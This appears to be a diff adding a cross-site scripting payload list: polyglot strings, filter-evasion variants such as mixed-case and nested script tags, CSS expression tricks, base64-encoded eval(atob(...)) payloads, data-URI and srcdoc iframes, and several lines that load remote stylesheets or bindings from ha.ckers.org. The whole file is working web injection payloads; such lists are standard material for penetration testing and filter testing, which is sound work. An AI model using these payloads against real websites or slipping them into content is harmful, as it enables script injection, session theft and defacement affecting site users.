@@ -1,0 +1,60 @@
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+javascript://%250Aalert(1)//"  
+'"><img src=x onerror=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<script>alert(1)</script>
+<IMG SRC=javascript:alert(1)>
+<IMG SRC=JaVaScRiPt:alert(1)>
+<IMG SRC=javascript:alert(&quot;1&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, '1'")`>
+<a onmouseover="alert(1)">
+<body onload=alert(1)>
+<div style="width:expression(alert(1))">
+<img src="/" =_=" title="onerror='alert(1)'">
+<img src='1' onerror='alert(1)'>
+<iframe src="javascript:alert(1)"></iframe>
+<svg/onload=alert(1)>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1);">
+<xml><s><script>alert(1)</script></s></xml>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style>@im\port'\ja\vasc\ript:alert(1)';</style>
+<? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<XSS STYLE="xss:expression(alert('XSS'))">
+<XSS STYLE="behavior: url(xss.htc);">
+<DIV STYLE="width: expression(alert('XSS'));">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+
+# ================================================================
+# BASE64 POLYGLOTS
+# ================================================================
+# Combines multiple execution contexts with base64
+
+# Multi-event base64 polyglot
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))><svg onload=eval(atob('YWxlcnQoMSk='))>
+
+# Attribute breakout + base64
+" onmouseover=eval(atob('YWxlcnQoMSk=')) "
+
+# Script context + base64
+';eval(atob('YWxlcnQoMSk='));//
+</script><script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Mixed encoding polyglot (base64 + unicode)
+<img src=x onerror=\u0065val(atob('YWxlcnQoMSk='))>
+
+# ================================================================
+# DATA URI POLYGLOTS
+# ================================================================
+# Works in multiple contexts (iframe src, object data, a href)
+"><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><a href="javascript:alert(1)">
+
+# SVG + HTML + JavaScript polyglot
+<svg><a href="javascript:alert(1)"><text y=20>click</text></a></svg>
+
+# Combined iframe srcdoc + data URI
+"><iframe srcdoc="<iframe src='data:text/html,<script>alert(1)</script>'>">
